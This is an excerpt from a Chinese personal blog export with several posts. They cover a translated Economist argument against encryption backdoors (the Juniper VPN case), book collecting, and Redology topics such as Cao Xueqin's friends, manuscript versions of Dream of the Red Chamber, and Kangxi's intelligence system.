    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>一些情报机构赞同在加密软件中放置后门程序，但是谁使用它们呢？</p>
<span id="more"></span>
<ul>
<li>原文：<a href="#">Internet security | When back doors backfire |Jan 2nd 2016</a></li>
</ul>
<p>如果没有加密技术，互联网上传递的信息倒不如写在明信片上。因此，政府、银行和商业机构都对自己的信息加密，当然恐怖组织和犯罪团伙也是如此。后门的问题就是这样，尽管它能让特工的工作更顺利，但也让互联网的每个人都失去了很多秘密。</p>
<p>近期Juniper公司（一家美国网络硬件和软件供应商）事件的启示，清楚地说明了这点。Juniper在12月紧急发布后门公告，最早可追溯到2012年，它使得任何人可以解读基于VPN软件的加密流量（虚拟私有网络），VPN广泛应用于全球的企业和政府机构，以透过公共互联网链接不同办公区。目前不清楚谁该为此事负责，但是可能是在一个情报机构安装后门程序后，其他人又秘密的修改过。该后门涉及的加密标准包含一个有缺陷的随机数生成算法，它获得了美国国家安全局（NSA）的支持；另外一些线索指向中国或英国的情报机构。</p>
<p>针对不同侦查目标破解加密信息显然是情报结构的职责范围，这也是政府结构应当具备监测能力最好理由，当然是在国家安全利益和法律框架的情况下。为了侦查行动而引入后门程序，风险是可能被胡作非为的特工、敌国政府或者犯罪者滥用，而且是在合法的前提下。目前不清楚Juniper的后门程序是什么人安装、使用，结局是什么。</p>
<h4 id="who-behind"><a href="#who-behind" class="headerlink" title="who behind"></a>who behind</h4><p>情报机构辩解称：该后门非常隐秘、足够复杂，他们未经授权使用是不可能的。但是外来者可能偶然发现或者窃取到这个漏洞的细节。特别是美国在安全储存保密数据方面的记录非常糟糕。众所周知，在这个夏天，人事管理办公室发生泄密，包括2000万以上联邦雇员（公务员）的敏感个人数据，据称是中国人干的。有人称这一事件为美国情报史上最大的灾难。唯有Edward Snowden 泄密事件可以与之相比，（斯诺登：前国家安全局承包商雇员，目前居住在莫斯科）。（机场安全当局也不小心泄漏了万能钥匙——能打开大多数商业行李——一种物理上的后门）。</p>
<h4 id="反击后门"><a href="#反击后门" class="headerlink" title="反击后门"></a>反击后门</h4><p>因此强制性置入后门的观点应当抵制。他们可能被犯罪者利用、从整体上削弱互联网安全，亿万人民赖以进行银行和支付业务。这种行为将损害公众对技术公司的信心，也使西方国家政府对独裁政权干涉互联网的批评更加困难。他们过分的要求在任何情况下都是徒劳的：没有后门的高性能加密软件，任何人在网上都可以免费获得。</p>
<p>与其通过后门程序削弱每个人的秘密，特工应当使用其他手段。</p>
<p>11月巴黎恐怖袭击之所以能成功，不是因为恐怖分子使用了高超的计算机技术，而是因为他们的活动信息没有被有效共享。必要时，国家安全局和其他情报机构通常能用特殊方式在嫌疑人的计算机和手机上植入蠕虫病毒。这比使用一个通用的后门要困难和低效——但是它对别人更安全。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><p>NSA： National Security Agency<br>隶属美国国防部（DoD），办公地点在五角大楼，主管是现役军官。和CIA工作的最大不同之处在于，后两者首要的工作是面向“人”的间谍活动，而NSA不能参与此类间谍活动它的典型工作比如监视反越战活动，经济间谍活动，遭斯诺登泄露的公众信息是由NSA负责监控的。</p>
</li>
<li><p>a new law just passed in China<br>2015年7月1日，中国全国人大通过了新的《国家安全法》，首次提出“国家建设网络与信息安全保障体系”，“维护国家网络空间主权、安全和发展利益”</p>
</li>
<li><p>Juniper 漏洞<br>2015年12月Juniper发布紧急公告，称在对其 NetScreen 产品的内部代码审计过程中发现了两枚漏洞,可以让资深的攻击者获得对 NetScreen 设备的管理权限和解密 VPN 流量。</p>
</li>
<li><p>VPN 虚拟专用网络<br>在公用网络上建立专用网络，进行加密通讯。在企业网络中有广泛应用。VPN可通过服务器、硬件、软件等多种方式实现VPN能提供高水平的安全，使用高级的加密和身份识别协议保护数据避免受到窥探，阻止数据窃贼和其他非授权用户接触这种数据。</p>
</li>
</ul>
<h4 id="《The-Cyber-Security-Master》"><a href="#《The-Cyber-Security-Master》" class="headerlink" title="《The Cyber-Security Master》"></a><a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></h4><ul>
<li><a href="https://riboseyim.github.io/2017/05/09/CyberSecurity-Hacker/">Cyber-Security: 黑客与技术、产业及其精神世界</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/10/29/CyberSecurity-WiFi/">Cyber-Security: 警惕 Wi-Fi 漏洞</a></li>
<li><a href="https://riboseyim.github.io/2017/08/31/CyberSecurity-Headers/">Cyber-Security: Web应用安全：攻击、防护和检测</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2016/10/06/CyberSecurity-SSH/">Cyber-Security: OpenSSH 并不安全</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/CyberSecurity-Trojan/">Cyber-Security: Linux/XOR.DDoS 木马样本分析</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">Packet Capturing:关于网络数据包的捕获、过滤和分析</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
<li><a href="http://www.jianshu.com/p/670c4d2bb419">Cyber-Security: 事与愿违的后门程序 | Economist</a></li>
<li><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/">Cyber-Security: 美国网络安全立法策略</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.miit.gov.cn/n1146285/n1146352/n3054355/n3057724/n3057734/c6521880/content.html">2018年第三季度网络安全威胁态势分析与工作综述|工信部</a><br>宁夏自治区近百万个IP地址发送NTP（Network Time Protocol,网络时间协议）响应信息，疑似被用作DDoS攻击，经宁夏自治区通信管理局组织相关单位研判，确定为宁夏电信公司为家庭宽带用户安装的光调制解调器开启了NTP服务，被攻击者恶意请求后返回的响应信息，宁夏自治区通信管理局督促宁夏电信公司及时对相关用户的近百万台光调制解调器进行远程固件升级，关闭NTP服务，消除被用作发起NTP型DDoS攻击的风险。</li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title>关于藏书与阅读</title>
    <url>/2016/07/03/Reading/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>关于阅读方法</li>
<li>关于 Kindle 与电子出版</li>
<li>胡适：找书的快乐</li>
</ul>
<a id="more"></a>
<h2 id="关于阅读方法"><a href="#关于阅读方法" class="headerlink" title="关于阅读方法"></a>关于阅读方法</h2><ul>
<li><a href="http://www.jianshu.com/p/f14adecf761f" target="_blank" rel="noopener">案例：如何消化大部头专著</a></li>
<li><a href="https://riboseyim.github.io/2016/12/19/Check2017-Plan/" target="_blank" rel="noopener">案例：2017年初制定的阅读计划</a></li>
</ul>
<h4 id="关于-Kindle-与电子出版"><a href="#关于-Kindle-与电子出版" class="headerlink" title="关于 Kindle 与电子出版"></a>关于 Kindle 与电子出版</h4><ul>
<li>优势场景：飞机、高铁</li>
<li>劣势</li>
</ul>
<h4 id="Kindle-技巧"><a href="#Kindle-技巧" class="headerlink" title="Kindle 技巧"></a>Kindle 技巧</h4><p>1、Knotes:标记内容导出 （仅限于kindle）<br>2、kindle for mac 标记内容导出 （未解决）</p>
<h2 id="胡适：找书的快乐"><a href="#胡适：找书的快乐" class="headerlink" title="胡适：找书的快乐"></a>胡适：找书的快乐</h2><blockquote>
<p>我不是藏书家，只不过是一个爱读书，能够用书的书生。</p>
</blockquote>
<h4 id="藏书的之于书生：没有猴子的叫花子"><a href="#藏书的之于书生：没有猴子的叫花子" class="headerlink" title="藏书的之于书生：没有猴子的叫花子"></a>藏书的之于书生：没有猴子的叫花子</h4><blockquote>
<p>我离开北平时，已经有一百箱的书，大约有一、二万册……收集了这么多的书，舍弃了太可惜，带吧，因为坐飞机又带不了。结果只带了一些笔记，并且在那一二万册书中，挑选了一部书，作为对一、二万册书的纪念，这一部书就是残本的《红楼梦》。四本只有十六回，这四本《红楼梦》可以说是世界上最老的抄本。收集了几十年的书，到末了只带了四本，<strong>等于当兵缴了械，我也变成了一个没有棍子，没有猴子的变把戏的叫花子</strong>。（1959年12月27日，（台湾）中国图书馆学会年会所作的演讲）</p>
</blockquote>
<h4 id="藏书的方法：无所不收"><a href="#藏书的方法：无所不收" class="headerlink" title="藏书的方法：无所不收"></a>藏书的方法：无所不收</h4><blockquote>
<p>自己买书的时候，总是先买工具书，然后再买本行书，换一行时，就得另外买一种书。今年我六十九岁了，还<strong>不知道自己的本行到底是那一门</strong>？是中国哲学呢？还是中国思想史？抑或是中国文学史？或者是中国小说史？《水经注》？中国佛教思想史？中国禅宗史？我所说的“本行”，其实就是我的兴趣，<strong>兴趣愈多就愈不能不收书了</strong>。</p>
<p>做考据工作，<strong>没有书是很可怜的</strong>。考证《红楼梦》的时候，大家知道的材料很多，普通所看到的《红楼梦》都是一百二十回本。这种一百二十回本并非真的《红楼梦》。…… 民国十六年我从欧美回国，住在上海，有人写信告诉我，要卖一本《脂砚斋评石头记》给我，那时<strong>我以为自己的资料已经很多</strong>，未加理会。不久以后和徐志摩在上海办新月书店，那人又将书送来给我看，原来是甲戌年手抄再评本，虽然只有十六回，但却包含了许多重要史料。</p>
<p>根据我个人几十年来找书的经验，发现我们过去的藏书的范围是偏狭的，过去收书的目标集于收藏古董，小说之类决不在藏书之列。但我们必须了解了解，<strong>真正收书的态度，是要无所不收的</strong>。</p>
</blockquote>
<h2 id="推荐书单"><a href="#推荐书单" class="headerlink" title="推荐书单"></a>推荐书单</h2><ul>
<li><p><a href="https://mp.weixin.qq.com/s/og540vNfkW0h4gdcfsXWEA" target="_blank" rel="noopener">2017年读书札记 | 原创 2018-01-21 阳志平 心智工具箱</a><br>《读书法》作者桑兵说，放眼读书，前十年未必胜，中十年不会败，后十年无须战。我想说，用心交友，前十年一定少，中十年开始多，后十年知交满天下。与人为友，青春美丽，盛宴华筵，欢乐终有时；与书为友，安然静坐，促膝长谈，乐哉新相知。</p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3MzM0MjUyMQ==&amp;mid=2652149688&amp;idx=1&amp;sn=33e41790073652e3642656067479b5dc&amp;chksm=84f0bceeb38735f893f30b30117960c72a34661fe8279a6f3d697fdff8d1eaa74106168f120f&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">2016年读书札记 | 原创 2017-01-04 阳志平 心智工具箱</a></p>
</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.theglobeandmail.com/opinion/i-have-forgotten-how-toread/article37921379" target="_blank" rel="noopener">I have forgotten how to read</a></li>
<li><a href="http://mp.weixin.qq.com/s/R7K1MlCTx1epRkeQ0pdv2w" target="_blank" rel="noopener"></a><br>人分为两类：一类是刺猬，他们对世界的认识依赖一到两个重大观点；<br>一类是狐狸，他们认为世界太过复杂，无法归结为单一的口号。超级预言家毫无例外都来自“狐狸”的行列。</li>
</ul>
]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
  </entry>
  <entry>
    <title>红楼故事：佩刀沽酒作长歌</title>
    <url>/2017/10/04/Redology-DunMing/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>《红楼梦》传世之后，关于作者、写作年代等诸多关键问题多有争议。根据胡适的考证，敦诚、敦敏为曹雪芹好友，与《红楼梦》作者曹雪芹时有往来，交情甚佳。他们之间的唱和诗文是极少数“同时人的证见”，是重要的史料佐证。</p>
<p>爱新觉罗·敦敏（1729年—1796年），清宗室，字子明，号懋斋，曾任右翼宗学总管（宗学，即皇族子弟学堂），著有《懋斋诗钞》。爱新觉罗·敦诚（1734年-1791年），敦敏弟，字敬亭，号松堂，别号佣闲子，著有《四松堂诗文集》。</p>
<a id="more"></a>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Redology-Nier.jpg" alt></p>
<h4 id="赠曹雪芹"><a href="#赠曹雪芹" class="headerlink" title="赠曹雪芹"></a>赠曹雪芹</h4><ul>
<li>作者：爱新觉罗·敦敏<br>碧水青山曲径遐，薜萝门巷足烟霞。<br>寻诗人去留僧壁，卖画钱来付酒家。<br>燕市狂歌悲遇合，秦淮残梦忆繁华。<br>新愁旧恨知多少，都付酕醄醉眼斜。</li>
</ul>
<p>敦敏、敦诚为努尔哈赤第十二子、爱新觉罗·阿济格五世孙。英亲王阿济格可谓沙场勇将、战绩显赫，为大清朝初期平定江山立下了汗马功劳。</p>
<blockquote>
<p>“国初开创，栉风沐雨，以百战定天下，繄诸王是庸。” —— 赵尔巽</p>
</blockquote>
<ul>
<li>爱新觉罗·阿济格生于明万历三十九年（1605年）七月十五日</li>
<li>天命十年（1625年，20岁），追杀察哈尔部林丹汗；</li>
<li>天命十一年（1626年，21岁），讨伐喀尔喀巴林部、扎鲁特部，封贝勒；</li>
<li>天聪元年（1627年，22岁），攻朝鲜王朝，连克五城</li>
<li>天聪三年（1629年，24岁），攻锦州、宁远等地, 斩杀明山海关总兵赵率教</li>
<li>天聪四年（1630年，25岁），大凌河会战，北逐明军四十里</li>
<li>崇德二年（1637年，32岁），攻克皮岛； 崇德七年（1642年），大败吴三桂</li>
<li>顺治元年（1644年，39岁），从多尔衮在山海关之战中大败李自成大顺军，封<strong>和硕英亲王</strong>，序称“八王”。 受命为靖远大将军，率平西王吴三桂、智顺王尚可喜等满、蒙、汉军3万余，自山西入陕，追击李自成大顺军至湖广。</li>
<li>顺治二年（1645年，40岁），俘杀大顺政权的权将军刘宗敏、军师宋献策。招降明宁南侯左良玉的儿子左梦庚、总督袁继咸部的马步兵10万，相继占领河南、湖广、江西、江南的63城。</li>
</ul>
<h4 id="佩刀质酒歌"><a href="#佩刀质酒歌" class="headerlink" title="佩刀质酒歌"></a>佩刀质酒歌</h4><ul>
<li>作者：爱新觉罗·敦诚<br>秋晓遇雪芹于槐园，风雨淋涔，朝寒袭袂。时主人未出，<strong>雪芹酒渴如狂，余因解佩刀沽酒而饮之</strong>。雪芹欢甚，作长歌以谢余。余亦作此答之。</li>
</ul>
<p>我闻贺鉴湖，不惜金龟掷酒垆。<br>又闻阮遥集，直卸金貂作鲸吸。<br>嗟余本非二子狂，腰间更无黄金珰。<br>秋气酿寒风雨恶，满园榆柳飞苍黄。<br>主人未出童子睡，斝干瓮涩何可当！<br>相逢况是淳于辈，一石差可温枯肠。<br>身外长物亦何有？鸾刀昨夜磨秋霜。<br>曹子大笑称“快哉”！击石作歌声琅琅。<br>知君诗胆昔如铁，堪与刀颖交寒光。<br>我有古剑尚在匣，一条秋水苍波凉。<br>君才抑塞倘欲拔，不妨斫地歌王朗。</p>
<p>论出身，曹不过犯官之后，敦敏兄弟为皇室贵胄；论境遇，敦敏为长官——曹雪芹曾在其治下的左翼宗学任满语教习。但是从诗文中可见，敦敏等却相当尊重曹雪芹，敬为“曹子”，并且为曹“解佩刀沽酒”，颇有古侠客肝胆，家先祖遗风。</p>
<p>顺治七年（1650年），多尔衮病危。阿济格因参与密谋摄政王位之事而遭到顺治皇帝幽禁、赐死。阿济格部下皆涉案获罪，许多人被鞭责、革职或是处死、抄家，家人革除宗籍（皇室待遇）。据传阿济格在幽禁期间，不仅没有一丝收敛，反而在监房内私藏大刀，暗掘地道，声称要放火烧毁监房。</p>
<p>乾隆十一年（1746），乾隆皇帝实行“亲亲睦族”政策，为众多皇族宗室平反，重修了阿济格园寝。敦敏家族也恢复了皇室宗籍，享有部分特权，但在皇室中仍处于受排斥的地位，长期在北京闲居。</p>
<p>也许正是双方相似的家世背景，经历过盛极而衰的人情冷暖，才促成了这一段荒村沽酒、纵论红楼的佳话。胡适：“曹雪芹当时已很贫穷，穷的很不像样子了，故敦诚有‘残杯冷炙有德色’的劝诫。…… 曹雪芹在那贫穷潦倒的境遇里，很觉得牢骚抑郁，故不免纵酒狂歌，自寻排遣。”  亦或者说，如果没有这些仗义侠士的物质和精神支持，《红楼》能否成书都不得而知。</p>
<blockquote>
<p>“字字看来皆是血，十年辛苦不寻常。” —— 脂砚斋</p>
</blockquote>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/10/04/Redology-DunMing/" target="_blank" rel="noopener">红楼故事：佩刀沽酒作长歌</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/" target="_blank" rel="noopener">红楼故事：康熙的秘密情报系统</a></li>
<li>史景迁|《康熙与曹寅》</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>History</tag>
        <tag>Artistic</tag>
        <tag>Redology</tag>
      </tags>
  </entry>
  <entry>
    <title>红学 | Overview of Redology</title>
    <url>/2017/08/28/Redology/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>版本（脂砚斋点评本（甲戌、乙卯、庚辰）、俄藏本、程高本）</li>
<li>主题：金陵十二钗</li>
<li><a href="https://riboseyim.github.io/2017/10/04/Redology-DunMing/" target="_blank" rel="noopener">红楼故事：佩刀沽酒作长歌</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/" target="_blank" rel="noopener">红楼故事：康熙的秘密情报系统</a></li>
<li>（清）费丹旭 《十二金钗图册》</li>
</ul>
<a id="more"></a>
<h2 id="红楼故事"><a href="#红楼故事" class="headerlink" title="红楼故事"></a>红楼故事</h2><ul>
<li><a href="https://riboseyim.github.io/2017/10/04/Redology-DunMing/" target="_blank" rel="noopener">红楼故事：佩刀沽酒作长歌</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/" target="_blank" rel="noopener">红楼故事：康熙的秘密情报系统</a></li>
</ul>
<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><h4 id="甲戌本（名“至脂砚斋甲戌抄阅再评仍用石头记”）"><a href="#甲戌本（名“至脂砚斋甲戌抄阅再评仍用石头记”）" class="headerlink" title="甲戌本（名“至脂砚斋甲戌抄阅再评仍用石头记”）"></a>甲戌本（名“至脂砚斋甲戌抄阅再评仍用石头记”）</h4><ul>
<li>现藏：中国上海博物馆</li>
<li>相关人物：胡适（胡适去世后，此本转存于美国康乃尔大学。2005年，中国将此本购回）</li>
<li>简要说明：<br>甲戌，指乾隆十九年（1754年）。共存16回（1—8回，13—16回，25—28回），4回一册，分装为4册。<br>虽然发现年份和标定年代都最早，但一般认为此本为最后审定，准备付印的誊抄本；所依据底稿本应该在庚辰本之后。 此本有脂砚斋一千多条批语，被称为“脂批”，各回皆有朱笔夹批、眉批等。</li>
</ul>
<h4 id="己卯本（名“脂砚斋四阅评过，己卯冬定本”）"><a href="#己卯本（名“脂砚斋四阅评过，己卯冬定本”）" class="headerlink" title="己卯本（名“脂砚斋四阅评过，己卯冬定本”）"></a>己卯本（名“脂砚斋四阅评过，己卯冬定本”）</h4><ul>
<li>现藏：中国国家图书馆</li>
<li>简要说明：<br>共存42回（1—20回，31—40回，55回后半，56—58回，59回前半，61—63回，65回，66回，68—70回）。因31回—40回这一册的目录页上，有“己卯冬月定本”六个字得名。己卯，指乾隆二十四年（1759年）。</li>
</ul>
<h4 id="庚辰本（名“脂砚斋四阅评过，庚辰秋定本”）"><a href="#庚辰本（名“脂砚斋四阅评过，庚辰秋定本”）" class="headerlink" title="庚辰本（名“脂砚斋四阅评过，庚辰秋定本”）"></a>庚辰本（名“脂砚斋四阅评过，庚辰秋定本”）</h4><ul>
<li>现藏：中国北京大学图书馆</li>
<li>相关人物：徐星署（原出旗人家中，徐星署1933年初以八银币购于北京东城隆福寺地摊）</li>
<li>简要说明：<br>共存78回（1—80回，缺64回、67回，其68回脱去约600字，估计失去一页）。10回一册，装成8册<br>庚辰，指乾隆二十五年（1760年）。“庚辰本”是至今发现的含有脂批回目最多最完整的一个《红楼梦》版本。庚辰本有甲戌本所缺各回中的2000多条批语，十一回之前，除偶将回前总评与正文抄在一处外，都无批语，为白文本。朱笔批语全集中在第十二回到第二十八回。脂批中署年月名号的几乎都发现于庚辰本，庚辰本的底本年代相当早，留有一些作者和批注者自存本的痕迹； 但抄手不止一人，其文化水平与认真程度都很低。全书讹文脱字，触目皆是。最后一册质量尤差，几难卒读。</li>
</ul>
<h4 id="俄藏本"><a href="#俄藏本" class="headerlink" title="俄藏本"></a>俄藏本</h4><ul>
<li>现藏：俄罗斯圣彼得堡东方研究所</li>
<li>相关人物：周汝昌</li>
<li>简要：<br>没有总书名，除少数几回名《红楼梦》外，各回皆名《石头记》，存78回（缺5、6回）</li>
</ul>
<h4 id="程高本"><a href="#程高本" class="headerlink" title="程高本"></a>程高本</h4><p>相关人物：程伟元、高鹗</p>
<ul>
<li>程甲本（1791）：程伟元、高鹗于1791年出版的活字印刷本，120回。</li>
<li>程乙本（1792）：程伟元、高鹗于1792年出版的活字印刷本，120回。对程甲本作了不少修改。</li>
</ul>
<h2 id="流派"><a href="#流派" class="headerlink" title="流派"></a>流派</h2><ul>
<li>索隐派：政治小说<br>蔡元培：1915年《石头记索隐》</li>
<li>考证派：自传<br>胡适：1921年《红楼梦考证》<br>周汝昌：1998年《红楼梦新证》<br>俞平伯：1923年《红楼梦辩》，1952年《红楼梦研究》</li>
<li>文学批评派：美学<br>王国维</li>
</ul>
<h2 id="主题：金陵十二钗"><a href="#主题：金陵十二钗" class="headerlink" title="主题：金陵十二钗"></a>主题：金陵十二钗</h2><div class="table-container">
<table>
<thead>
<tr>
<th>正册</th>
<th>副册</th>
<th>又副册</th>
</tr>
</thead>
<tbody>
<tr>
<td>林黛玉</td>
<td>香菱</td>
<td>晴雯</td>
</tr>
<tr>
<td>薛宝钗</td>
<td>薛宝琴</td>
<td>袭人</td>
</tr>
<tr>
<td>贾元春</td>
<td>尤三姐</td>
<td>小红</td>
</tr>
<tr>
<td>贾探春</td>
<td>尤二姐</td>
<td>鸳鸯</td>
</tr>
<tr>
<td>史湘云</td>
<td>邢岫烟</td>
<td>紫鹃</td>
</tr>
<tr>
<td>妙玉</td>
<td>李纹</td>
<td>金钏</td>
</tr>
<tr>
<td>贾迎春</td>
<td>李绮</td>
<td>莺儿</td>
</tr>
<tr>
<td>贾惜春</td>
<td>宝蟾</td>
<td>司棋</td>
</tr>
<tr>
<td>王熙凤</td>
<td>宝珠</td>
<td>玉钏</td>
</tr>
<tr>
<td>贾巧姐</td>
<td>瑞珠</td>
<td>茜雪</td>
</tr>
<tr>
<td>李纨</td>
<td>平儿</td>
<td>麝月</td>
</tr>
<tr>
<td>秦可卿</td>
<td>娇杏</td>
<td>柳五儿</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>（清）费丹旭 《十二金钗图册》<br>现藏于<a href="http://www.dpm.org.cn/collection/paint/228737.html?hl=红楼梦十二钗" target="_blank" rel="noopener">北京故宫博物院(查看高清)</a> 绢本，设色，每开纵20.3cm，横27.7cm。<br>款署：“辛丑春日为兰汀大兄大人属，晓楼弟费丹旭。辛丑为清道光二十一年（1841年）。钤“子苕”、“丹旭”等印。鉴藏印钤“苍尗过眼”、“笙鱼秘玩”、“宝琅之华”等。后幅有（清）袁松等人跋2段。图中部分人物的面容、衣裙有斑驳的黑污色，这是因为作者所使用的白粉内含有金属成份，在氧化作用下出现返铅的结果。其他著名的插图有王希廉本、聚珍堂本、翰苑楼本、点石斋石印本、云声雨楼石印本以及改琦创作的《红楼梦图咏》、《红楼梦图》、《红楼梦临本》等。</li>
</ul>
<p>费丹旭作为以擅绘仕女著称的画家，深受《红楼梦》配图之风的感染和启发，他于25岁时便应人之邀绘有具民间风格的《红楼梦人物图》册一本。40岁时，他又受兰汀先生之请绘成此12开图册，每开绘1人，行游于山石、树木、房舍间。作者依据小说的描写和自身对作品的理解描绘出不同人物的年龄、身份、行为特征及其精神气质，图中人物虽未标识姓名，但可以通过画面得以确认。如树下持锄葬花的女子，颇具“风露清愁”的气质，她便是“孤标傲世”的林黛玉；醉卧芍药花丛中的是史湘云；衣着华饰、行于宫苑台阶之上的是贾元春；临窗而坐、展纸吮毫的是贾惜春；灯下托颐沉思的是秦可卿；执扇扑蝶的是为人谨慎的薛宝钗；端坐书几旁、体态虚弱的是妙玉；手扶柴门四下张顾的是巧姐等。</p>
<p>（清）秦祖永《桐阴论画》言费丹旭“补景仕女，香艳中更饶妍雅之致，一树一石，虽未能深入古法，而一种潇洒之致颇极自然。”</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E5%9B%BE%E5%86%8C_%E5%85%83%E6%98%A5.png" alt="贾云春"><br>判词：二十年来辨是非，榴花开处照宫闱。三春争及初春景，虎兕相逢大梦归。<br><img src="http://riboseyim-qiniu.riboseyim.com/%E5%9B%BE%E5%86%8C_%E6%83%9C%E6%98%A5_%E4%BD%9C%E7%94%BB.png" alt="贾惜春"><br>判词：勘破三春景不长,缁衣顿改昔年妆。可怜绣户侯门女,独卧青灯古佛旁。<br><img src="http://riboseyim-qiniu.riboseyim.com/%E5%9B%BE%E5%86%8C_%E8%BF%8E%E6%98%A5.png" alt="贾迎春"><br>判词：子系中山狼，得志便猖狂。金闺花柳质，一载赴黄粱。<br><img src="http://riboseyim-qiniu.riboseyim.com/%E5%9B%BE%E5%86%8C_%E6%8E%A2%E6%98%A5.png" alt="贾探春"><br>判词：才自精明志自高，生于末世运偏消。清明涕送江边望，千里东风一梦遥。<br><img src="http://riboseyim-qiniu.riboseyim.com/%E5%9B%BE%E5%86%8C_%E7%8E%8B%E7%86%99%E5%87%A4.png" alt="王熙凤"><br>判词：凡鸟偏从末世来，都知爱慕此生才。一从二令三人木，哭向金陵事更哀。<br><img src="http://riboseyim-qiniu.riboseyim.com/%E5%9B%BE%E5%86%8C_%E9%BB%9B%E7%8E%89.png" alt="林黛玉"><br>判词：可叹停机德，堪怜咏絮才；玉带林中挂，金簪雪里埋。<br><img src="http://riboseyim-qiniu.riboseyim.com/%E5%9B%BE%E5%86%8C_%E5%AE%9D%E9%92%97.png" alt="薛宝钗"><br>判词：可叹停机德，堪怜咏絮才；玉带林中挂，金簪雪里埋。<br><img src="http://riboseyim-qiniu.riboseyim.com/%E5%9B%BE%E5%86%8C_%E5%A6%99%E7%8E%89.png" alt="妙玉"><br>判词：欲洁何曾洁? 云空未必空。可怜金玉质，终陷淖泥中。<br><img src="http://riboseyim-qiniu.riboseyim.com/%E5%9B%BE%E5%86%8C_%E6%9D%8E%E7%BA%A8.png" alt="李纨"><br>判词：桃李春风结子完，到头谁似一盆兰。如冰水好空相妒，枉与他人作笑谈。<br><img src="http://riboseyim-qiniu.riboseyim.com/%E5%9B%BE%E5%86%8C_%E7%A7%A6%E5%8F%AF%E5%8D%BF.png" alt="秦可卿"><br>判词：情天情海幻情深，情既相逢必主淫。漫言不肖皆荣出，造衅开端实在宁。<br><img src="http://riboseyim-qiniu.riboseyim.com/%E5%9B%BE%E5%86%8C_%E5%8F%B2%E6%B9%98%E4%BA%91.png" alt="史湘云"><br>判词：富贵又何为？襁褓之间父母违。展眼吊斜晖，湘江水逝楚云飞。</p>
<ul>
<li>贾巧姐<br>判词：势败休云贵，家亡莫论亲；偶因济刘氏，巧得遇恩人。</li>
</ul>
<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><ul>
<li><a href="http://theme.npm.edu.tw/opendata/index.aspx" target="_blank" rel="noopener">台北故宫 Open Data 专区</a></li>
</ul>
]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>History</tag>
        <tag>Artistic</tag>
        <tag>Redology</tag>
      </tags>
  </entry>
  <entry>
    <title>红楼故事：康熙的秘密情报系统</title>
    <url>/2018/02/04/Redology-Intelligence/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>一个政府的有效运作取决于对信息流动的仔细掌控。— 孔飞力</p>
</blockquote>
<p>曹雪芹的家族出身清廷内务府包衣，并有多人长期担任内务府要职，掌握这一背景是理解红楼梦的重要钥匙。</p>
<p>曹雪芹的曾祖父曹玺历任江宁织造，祖父曹寅历任苏州织造、江宁织造和两淮巡盐御史（江宁织造的任职长达三十年），曹寅姻亲李煦历任畅春园总管、苏州织造、两淮巡盐御史。根据现有资料来看，内务府织造官并不仅仅是负责工程、财税的经济官员，他们更像是康熙皇帝构建的庞大秘密情报系统中的关键成员。</p>
<a id="more"></a>
<h4 id="机要信息系统"><a href="#机要信息系统" class="headerlink" title="机要信息系统"></a>机要信息系统</h4><p>明清时期，王朝制定和完善了一套复杂的信息系统用于上通下达。根据上疏内容的不同，分为题本和奏本。官员上奏公事用题（例如兵马、钱粮、刑名、地方政务等），私事用奏（例如到任、谢恩或代所属官员谢恩，文字不超过三百字）。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Red-2018-3.png" alt></p>
